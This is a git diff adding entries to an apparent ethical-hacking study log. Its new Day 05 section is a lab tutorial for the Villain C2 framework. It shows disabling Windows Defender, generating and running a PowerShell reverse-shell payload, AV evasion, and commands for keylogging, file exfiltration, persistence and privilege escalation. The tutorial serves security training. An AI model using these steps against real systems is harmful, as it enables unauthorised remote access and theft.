@@ -1,5 +1,6 @@
  # Day 01
   Introduction to GitHub.
+  ---
 # Day 02
   Download VirtualBox and Kali Linux from it's official websites.
   
@@ -44,6 +45,7 @@ Kali Linux Booted Successfully!!!.
    + Burp Suite (web testing). 
 
    + John the Ripper (password cracking).
+---
 # Day 03
 ### Kali Linux Commends
 | Commands       | Uses                                      |
@@ -64,6 +66,7 @@ Kali Linux Booted Successfully!!!.
 | ls -lh   | Human-readable (e.g. 2K, 1M) | Understand size quickly |
 ---
 ### Introduction to Windows Hacking.
+---
 # Day 04
 # VirtualBox Network Adapters for Kali Linux
 <img width="500" height="290" alt="Screenshot 2025-07-28 180103" src="https://github.com/user-attachments/assets/9b891f20-afe8-4b59-925d-97329683d0d8"  />
@@ -185,4 +188,140 @@ Nmap (Network Mapper) is an open-source tool used for network discovery, securit
 | `nmap -oN scan.txt [target]`          | 💾 Save output in normal format to a file.                   |
 | `nmap --script http-enum [target]`    | 📝 Use NSE script to enumerate web resources.                 |
 | sudo arp-scan -l                      | 🔍Scan the entire local subnet to list all active devices with their IP and MAC addresses|
+---
+# Day 05
+# Creating Reverse shell for Windows Hacking using Villain FrameWork🕵️‍♂️💻
+
+   Villain is a C2 (Command & Control) framework for managing reverse shells and backdoors across multiple machines.  
+---
+## 1. Installation
+
+   ## Clone the Repository
+```bash
+git clone https://github.com/t3l3machus/Villain.git
+cd Villain
+```
+   ## Install Requirements
+```bash
+sudo apt update
+sudo apt install python3 python3-pip
+pip3 install -r requirements.txt
+```
+## 2. Launch Villain
+   Enter into Villain Directory by,
+```bash
+cd Villain
+```
+   Then launch Villain by pasting the below code.
+```bash
+sudo python3 Villain.py
+```
+<img width="1108" height="632" alt="Screenshot 2025-08-10 125426" src="https://github.com/user-attachments/assets/892e8110-a138-476a-b00a-a37325482824" /> 
+
+## 3. Turn off Windows Defender
+
+   - In Victum Machine(Windows).
+  
+      →Goto Windows Security
+  
+      →Virus & thread Protection
+  
+      →Virus & thread Protection Settings(Click Manage Settings)
+  
+      →Turn off Real-time Protection
+    
+## 4. Execute the Payload in Windows
+
+   - Copy the generated payload in the kali linux (Ctrl+Shift+C to Copy).
+  
+     <img width="1104" height="692" alt="Screenshot 2025-08-10 142143" src="https://github.com/user-attachments/assets/e00e2111-9275-4934-9f1d-dba5e7b72491" />
+
+   - Open Windows Power Shell
+     * paste the payload and click Enter.
+  
+     <img width="1472" height="404" alt="Screenshot 2025-08-10 142656" src="https://github.com/user-attachments/assets/6e65310e-3974-46f7-b226-e627e9710270" />
+
+   - You can see the new sessiion established in Villain Frame Work.
+
+     <img width="1103" height="468" alt="Screenshot 2025-08-10 144331" src="https://github.com/user-attachments/assets/3bda2bed-8807-4e23-b4c2-61cd165a0fab" />
+## 5. Villain Framework – Command Reference💀
+
+   A categorized list of **Villain C2 Framework** commands with their uses.  
+   Use this for penetration testing in **authorized lab environments only**.
+
+---
+
+## 1. General & Utility Commands
+   | Command | Purpose |
+   |---------|---------|
+   | `help` | Displays all available commands. |
+   | `clear` | Clears the terminal. |
+   | `exit` / `quit` | Exit the Villain interface. |
+   | `banner` | Show the Villain banner again. |
+   | `update` | Update Villain from the GitHub repo. |
+   | `flee` | Exit Villain without killing active sessions. |
+
+---
+
+## 2. Payload Generation
+| Command | Purpose |
+|---------|---------|
+| `generate` | Launch payload creation wizard. |
+| `generate payload=<type> lhost=<IP/interface> [lport=<port>]` | Create a payload directly. |
+| Example | `generate payload=windows/reverse_tcp/powershell lhost=eth0 lport=4444` |
+
+You can edit them for **customization and AV evasion**.
+
+---
+
+## 3. Session Management
+| Command | Purpose |
+|---------|---------|
+| `sessions` | List all active sessions. |
+| `sessions -k <ID>` | Kill a session. |
+| `shell <ID>` | Interact with a specific session. |
+| `background` | Send current session to background. |
+
+---
+
+## 4. Interactive Session Commands
+| Command | Purpose |
+|---------|---------|
+| `whoami` | Show current user on target. |
+| `sysinfo` | Get target system information. |
+| `upload <local> <remote>` | Upload file to target. |
+| `download <remote> <local>` | Download file from target. |
+| `inject <script>` | Inject and execute script. |
+| `screenshot` | Capture screenshot (Windows only). |
+| `keyscan_start` / `keyscan_dump` | Start and dump keylogger data. |
+| `conpty` | Launch interactive ConPtyShell (Windows). |
+
+---
+
+## 5. Collaboration & Multiplayer
+| Command | Purpose |
+|---------|---------|
+| `connect <IP> <port>` | Connect to another Villain server. |
+| `siblings` | Show connected sibling servers. |
+| `share <ID>` | Share a session with sibling server. |
+| `#<message>` | Send chat message to all connected servers. |
+
+---
+
+## 6. Stability & Persistence
+| Command | Purpose |
+|---------|---------|
+| `persistence` | Install persistence mechanism on target. |
+| `privesc` | Run privilege escalation scripts/checks. |
+| `defender` | Enable Session Defender to prevent shell hang due to typos. |
+
+---
+
+## ⚠ Legal Disclaimer
+This information is for **educational purposes** only.  
+Use **only** in environments where you have explicit permission.  
+Unauthorized access to computer systems is illegal.
+
+---
+
 
